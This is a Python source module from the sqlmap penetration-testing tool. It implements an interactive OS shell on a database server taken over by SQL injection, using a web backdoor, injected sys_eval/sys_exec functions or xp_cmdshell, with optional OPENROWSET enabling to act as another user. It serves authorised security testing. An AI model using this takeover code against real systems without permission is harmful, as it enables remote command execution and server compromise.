#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from extra.safe2bin.safe2bin import safechardecode
from lib.core.common import dataToStdout
from lib.core.common import Backend
from lib.core.common import getSQLSnippet
from lib.core.common import isTechniqueAvailable
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.core.shell import autoCompletion
from lib.request import inject
from lib.takeover.udf import UDF
from lib.takeover.web import Web
from lib.takeover.xp_cmdshell import xp_cmdshell


class Abstraction(Web, UDF, xp_cmdshell):
    """
    This class defines an abstraction layer for OS takeover functionalities
    to UDF / xp_cmdshell objects
    """

    def __init__(self):
        self.envInitialized = False
        self.alwaysRetrieveCmdOutput = False

        UDF.__init__(self)
        Web.__init__(self)
        xp_cmdshell.__init__(self)

    def execCmd(self, cmd, silent=False):
        if self.webBackdoorUrl and not isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
            self.webBackdoorRunCmd(cmd)

        elif Backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
            self.udfExecCmd(cmd, silent=silent)

        elif Backend.isDbms(DBMS.MSSQL):
            self.xpCmdshellExecCmd(cmd, silent=silent)

        else:
            errMsg = "Feature not yet implemented for the back-end DBMS"
            raise sqlmapUnsupportedFeatureException, errMsg

    def evalCmd(self, cmd, first=None, last=None):
        retVal = None

        if self.webBackdoorUrl and not isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
            retVal = self.webBackdoorRunCmd(cmd)

        elif Backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
            retVal = self.udfEvalCmd(cmd, first, last)

        elif Backend.isDbms(DBMS.MSSQL):
            retVal = self.xpCmdshellEvalCmd(cmd, first, last)

        else:
            errMsg = "Feature not yet implemented for the back-end DBMS"
            raise sqlmapUnsupportedFeatureException, errMsg

        return safechardecode(retVal)

    def runCmd(self, cmd):
        getOutput = None

        if not self.alwaysRetrieveCmdOutput:
            message = "do you want to retrieve the command standard "
            message += "output? [Y/n/a] "
            getOutput = readInput(message, default="Y")

            if getOutput in ("a", "A"):
                self.alwaysRetrieveCmdOutput = True

        if not getOutput or getOutput in ("y", "Y") or self.alwaysRetrieveCmdOutput:
            output = self.evalCmd(cmd)

            if output:
                conf.dumper.string("command standard output", output)
            else:
                dataToStdout("No output\n")
        else:
            self.execCmd(cmd)

    def shell(self):
        if self.webBackdoorUrl and not isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
            infoMsg = "calling OS shell. To quit type "
            infoMsg += "'x' or 'q' and press ENTER"
            logger.info(infoMsg)

        else:
            if Backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
                infoMsg = "going to use injected sys_eval and sys_exec "
                infoMsg += "user-defined functions for operating system "
                infoMsg += "command execution"
                logger.info(infoMsg)

            elif Backend.isDbms(DBMS.MSSQL):
                infoMsg = "going to use xp_cmdshell extended procedure for "
                infoMsg += "operating system command execution"
                logger.info(infoMsg)

            else:
                errMsg = "feature not yet implemented for the back-end DBMS"
                raise sqlmapUnsupportedFeatureException, errMsg

            infoMsg = "calling %s OS shell. To quit type " % (Backend.getOs() or "Windows")
            infoMsg += "'x' or 'q' and press ENTER"
            logger.info(infoMsg)

        autoCompletion(osShell=True)

        while True:
            command = None

            try:
                command = raw_input("os-shell> ")
            except KeyboardInterrupt:
                print
                errMsg = "user aborted"
                logger.error(errMsg)
            except EOFError:
                print
                errMsg = "exit"
                logger.error(errMsg)
                break

            if not command:
                continue

            if command.lower() in ( "x", "q", "exit", "quit" ):
                break

            self.runCmd(command)

    def __initRunAs(self):
        if not conf.dCred:
            return

        if not conf.direct and not isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
            errMsg = "stacked queries is not supported hence sqlmap cannot "
            errMsg += "execute statements as another user. The execution "
            errMsg += "will continue and the DBMS credentials provided "
            errMsg += "will simply be ignored"
            logger.error(errMsg)

            return

        if Backend.isDbms(DBMS.MSSQL):
            msg = "on Microsoft SQL Server 2005 and 2008, OPENROWSET function "
            msg += "is disabled by default. This function is needed to execute "
            msg += "statements as another DBMS user since you provided the "
            msg += "--dbms-creds switch. If you are DBA, you can enable it. "
            msg += "Do you want to enable it? [Y/n] "
            choice = readInput(msg, default="Y")

            if not choice or choice in ("y", "Y"):
                expression = getSQLSnippet(DBMS.MSSQL, "configure_openrowset", ENABLE="1")
                inject.goStacked(expression)

        # TODO: add support for PostgreSQL
        #elif Backend.isDbms(DBMS.PGSQL):
        #    expression = getSQLSnippet(DBMS.PGSQL, "configure_dblink", ENABLE="1")
        #    inject.goStacked(expression)

    def initEnv(self, mandatory=True, detailed=False, web=False):
        self.__initRunAs()

        if self.envInitialized:
            return

        if web:
            self.webInit()
        else:
            self.checkDbmsOs(detailed)

            if mandatory and not self.isDba():
                warnMsg = "functionality requested probably does not work because "
                warnMsg += "the curent session user is not a database administrator"

                if not conf.dCred and Backend.getIdentifiedDbms() in ( DBMS.MSSQL, DBMS.PGSQL ):
                    warnMsg += ". You can try to to use option '--dbms-cred' "
                    warnMsg += "to execute statements as a DBA user if you "
                    warnMsg += "were able to extract and crack a DBA "
                    warnMsg += "password by any mean"

                logger.warn(warnMsg)

            if Backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
                self.udfInjectSys()
            elif Backend.isDbms(DBMS.MSSQL):
                if mandatory:
                    self.xpCmdshellInit()
            else:
                errMsg = "feature not yet implemented for the back-end DBMS"
                raise sqlmapUnsupportedFeatureException(errMsg)

        self.envInitialized = True
